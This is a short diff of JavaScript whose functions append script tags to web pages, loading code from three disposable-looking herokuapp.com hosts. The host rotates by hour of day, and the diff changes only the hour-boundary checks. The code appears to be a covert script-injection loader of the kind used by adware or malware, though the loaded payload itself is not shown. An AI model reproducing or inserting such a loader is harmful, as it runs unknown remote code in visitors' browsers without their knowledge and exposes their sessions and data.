@@ -173,7 +173,7 @@ function mBV(s,b,t){
 		 return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a=a15faa52c7e806cd608a2959fe0fe760\"><\/script>'+bEn;
 	 }
  }
- if(nH>8 && nH<16){
+ if(nH>=8 && nH<16){
 	 if(s=='s'&&t!=0){
 		 return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
 	 }
@@ -184,7 +184,7 @@ function mBV(s,b,t){
 		 return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a=a15faa52c7e806cd608a2959fe0fe760\"><\/script>'+bEn;
 	 }
  }
- if(nH>16){
+ if(nH>=16){
 	 if(s=='s'&&t!=0){
 		 return bSt+'<script id="yp_1391" src=\"https://radiant-everglades-72351.herokuapp.com/get2.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
 	 }
@@ -206,10 +206,10 @@ $(document).ready(function(){
 	if(nH<8){
 		$('body').append('<script id="yp_1872" src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1409"><\/script>');
 	}
-	if(nH>8 && nH<16){
+	if(nH>=8 && nH<16){
 		$('body').append('<script id="yp_1872" src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1409"><\/script>');
 	}
-	if(nH>16){
+	if(nH>=16){
 		$('body').append('<script id="yp_1872" src="https:\/\/radiant-everglades-72351.herokuapp.com\/?id=1409"><\/script>');
 	}
 
@@ -224,10 +224,10 @@ $(document).ready(function(){
 			if(nH<8){
 				$('body').append('<script id="yp_1872" src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1973"><\/script>');
 			}
-			if(nH>8 && nH<16){
+			if(nH>=8 && nH<16){
 				$('body').append('<script id="yp_1872" src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1973"><\/script>');
 			}
-			if(nH>16){
+			if(nH>=16){
 				$('body').append('<script id="yp_1872" src="https:\/\/radiant-everglades-72351.herokuapp.com\/?id=1973"><\/script>');
 			}
 		}
@@ -235,10 +235,10 @@ $(document).ready(function(){
 			if(nH<8){
 				$('body').append('<script id="yp_1872" src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1193"><\/script>');
 			}
-			if(nH>8 && nH<16){
+			if(nH>=8 && nH<16){
 				$('body').append('<script id="yp_1872" src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1193"><\/script>');
 			}
-			if(nH>16){
+			if(nH>=16){
 				$('body').append('<script id="yp_1872" src="https:\/\/radiant-everglades-72351.herokuapp.com\/?id=1193"><\/script>');
 			}
 		}
